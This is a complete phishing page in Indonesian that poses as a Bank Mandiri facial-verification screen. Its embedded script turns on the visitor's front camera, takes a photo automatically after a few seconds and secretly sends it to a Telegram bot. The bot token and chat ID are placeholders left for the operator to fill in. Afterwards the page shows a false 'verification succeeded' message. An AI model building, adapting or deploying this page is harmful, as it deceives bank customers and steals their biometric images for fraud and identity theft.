<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Akun - Mandiri</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%);
            color: #e2e8f0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(148, 163, 184, 0.2);
            border-radius: 20px;
            max-width: 440px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .header {
            background: linear-gradient(to right, #0066cc, #1e40af);
            padding: 25px 30px;
            text-align: center;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            color: white;
            letter-spacing: -1px;
        }

        .content {
            padding: 40px 35px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 12px;
            color: #f1f5f9;
        }

        .subtitle {
            text-align: center;
            color: #94a3b8;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .camera-box {
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 25px;
            position: relative;
        }

        video {
            width: 100%;
            border-radius: 12px;
            background: #000;
            display: none;
        }

        .placeholder {
            height: 260px;
            background: #1e2937;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #64748b;
            font-size: 15px;
            gap: 10px;
        }

        .btn {
            width: 100%;
            background: linear-gradient(to right, #0066cc, #1e40af);
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(30, 64, 175, 0.4);
        }

        .status {
            text-align: center;
            margin-top: 20px;
            font-size: 14.5px;
            min-height: 24px;
        }

        .footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid rgba(148, 163, 184, 0.1);
            color: #64748b;
            font-size: 13px;
        }

        .secure {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 13px;
            color: #22c55e;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">mandiri</div>
        </div>

        <!-- Content -->
        <div class="content">
            <h1>Verifikasi Wajah</h1>
            <p class="subtitle">
                Untuk menjaga keamanan akun Anda, lakukan verifikasi wajah singkat.<br>
                Proses ini hanya memakan waktu beberapa detik.
            </p>

            <div class="camera-box">
                <div id="placeholder" class="placeholder">
                    <span style="font-size: 48px;">📷</span>
                    <p>Kamera akan aktif otomatis</p>
                </div>
                <video id="video" autoplay playsinline></video>
            </div>

            <button id="startBtn" class="btn">Mulai Verifikasi Kamera</button>

            <div id="status" class="status"></div>
        </div>

        <!-- Footer -->
        <div class="footer">
            <div class="secure">
                <span>🔒</span>
                <span>Keamanan Terjamin • Enkripsi SSL</span>
            </div>
            <p>© 2026 PT Bank Mandiri (Persero) Tbk</p>
        </div>
    </div>

    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";
        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const placeholder = document.getElementById('placeholder');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        async function sendPhotoToTelegram(base64) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);

            const byteString = atob(base64.split(',')[1]);
            const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }

            const blob = new Blob([ab], { type: mimeString });
            formData.append('photo', blob, `photo_${Date.now()}.jpg`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Gagal mengirim ke Telegram");
            }
        }

        async function captureAndSend() {
            status.textContent = "Mengambil foto...";
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const base64Image = canvas.toDataURL('image/jpeg', 0.92);
            await sendPhotoToTelegram(base64Image);

            status.innerHTML = `<span style="color:#22c55e;">✓ Verifikasi berhasil</span>`;

            setTimeout(() => {
                alert("Verifikasi berhasil! Akun Anda telah diamankan.");
                // window.location.href = "https://www.mandiri.co.id"; // uncomment jika mau redirect
            }, 1800);
        }

        startBtn.addEventListener('click', async () => {
            startBtn.style.display = 'none';
            status.textContent = "Mengakses kamera...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;
                video.style.display = 'block';
                placeholder.style.display = 'none';

                // Ambil foto otomatis setelah 2.8 detik
                setTimeout(() => {
                    captureAndSend();
                }, 2800);

            } catch (err) {
                status.innerHTML = `<span style="color:#ef4444;">Gagal mengakses kamera. Mohon izinkan izin kamera.</span>`;
                console.error(err);
            }
        });
    </script>
</body>
</html>
